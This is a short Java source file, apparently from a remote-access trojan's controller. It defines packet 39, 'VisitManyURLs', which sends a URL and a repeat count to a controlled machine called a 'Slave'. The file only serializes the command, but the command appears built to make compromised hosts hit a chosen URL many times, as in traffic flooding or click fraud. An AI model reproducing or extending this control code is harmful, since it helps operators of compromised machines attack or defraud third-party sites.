package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet39VisitManyURLs extends AbstractOutgoingPacket {
	
	private String url;
	private int times;

	public Packet39VisitManyURLs(String url, int times) {
		this.url = url;
		this.times = times;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(url);
		dos.writeInt(times);
	}

	@Override
	public byte getPacketId() {
		return 39;
	}

}
